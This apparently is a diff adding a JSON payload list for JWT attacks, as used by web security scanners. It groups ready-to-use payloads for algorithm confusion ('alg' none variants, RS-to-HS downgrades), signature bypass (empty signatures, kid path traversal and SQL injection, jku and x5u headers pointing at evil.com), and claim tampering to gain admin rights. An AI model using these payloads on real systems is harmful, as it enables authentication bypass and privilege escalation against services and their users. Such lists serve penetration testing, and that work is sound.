@@ -1,0 +1,43 @@
+{
+  "category": "jwt",
+  "contexts": {
+    "algorithm_confusion": {
+      "description": "JWT algorithm confusion and downgrade attacks",
+      "payloads": [
+        {"payload": "{\"alg\":\"none\"}", "description": "Algorithm none — strip signature entirely", "waf_bypass": false},
+        {"payload": "{\"alg\":\"None\"}", "description": "Algorithm None (case variant)", "waf_bypass": false},
+        {"payload": "{\"alg\":\"NONE\"}", "description": "Algorithm NONE (uppercase variant)", "waf_bypass": false},
+        {"payload": "{\"alg\":\"nOnE\"}", "description": "Algorithm mixed case bypass", "waf_bypass": false},
+        {"payload": "{\"alg\":\"HS256\"}", "description": "RS256 to HS256 downgrade — sign with public key as HMAC secret", "waf_bypass": false},
+        {"payload": "{\"alg\":\"HS384\"}", "description": "RS384 to HS384 downgrade", "waf_bypass": false},
+        {"payload": "{\"alg\":\"HS512\"}", "description": "RS512 to HS512 downgrade", "waf_bypass": false}
+      ]
+    },
+    "signature_bypass": {
+      "description": "JWT signature validation bypass techniques",
+      "payloads": [
+        {"payload": "", "description": "Empty signature — some libraries accept token.payload. (trailing dot)", "waf_bypass": false},
+        {"payload": "AAAA", "description": "Invalid short signature — test if validation is enforced", "waf_bypass": false},
+        {"payload": "{\"kid\":\"/dev/null\"}", "description": "kid path traversal to /dev/null (empty key)", "waf_bypass": false},
+        {"payload": "{\"kid\":\"../../dev/null\"}", "description": "kid relative path traversal", "waf_bypass": false},
+        {"payload": "{\"kid\":\"key' UNION SELECT 'secret'--\"}", "description": "kid SQL injection for key extraction", "waf_bypass": false},
+        {"payload": "{\"jku\":\"https://evil.com/.well-known/jwks.json\"}", "description": "jku header injection — attacker-controlled JWKS", "waf_bypass": false},
+        {"payload": "{\"x5u\":\"https://evil.com/cert.pem\"}", "description": "x5u header injection — attacker-controlled certificate", "waf_bypass": false},
+        {"payload": "{\"jwk\":{\"kty\":\"oct\",\"k\":\"AA\"}}", "description": "Embedded JWK with attacker key", "waf_bypass": false}
+      ]
+    },
+    "claim_manipulation": {
+      "description": "JWT claim tampering for privilege escalation and auth bypass",
+      "payloads": [
+        {"payload": "{\"sub\":\"admin\"}", "description": "Subject claim to admin user", "waf_bypass": false},
+        {"payload": "{\"role\":\"admin\"}", "description": "Role claim escalation", "waf_bypass": false},
+        {"payload": "{\"admin\":true}", "description": "Admin boolean claim injection", "waf_bypass": false},
+        {"payload": "{\"exp\":9999999999}", "description": "Expiration set to far future", "waf_bypass": false},
+        {"payload": "{\"iss\":\"https://evil.com\"}", "description": "Issuer claim to attacker domain", "waf_bypass": false},
+        {"payload": "{\"aud\":\"*\"}", "description": "Audience wildcard", "waf_bypass": false},
+        {"payload": "{\"scope\":\"admin openid profile\"}", "description": "Scope escalation with admin", "waf_bypass": false},
+        {"payload": "{\"groups\":[\"admin\",\"superuser\"]}", "description": "Group claim injection", "waf_bypass": false}
+      ]
+    }
+  }
+}
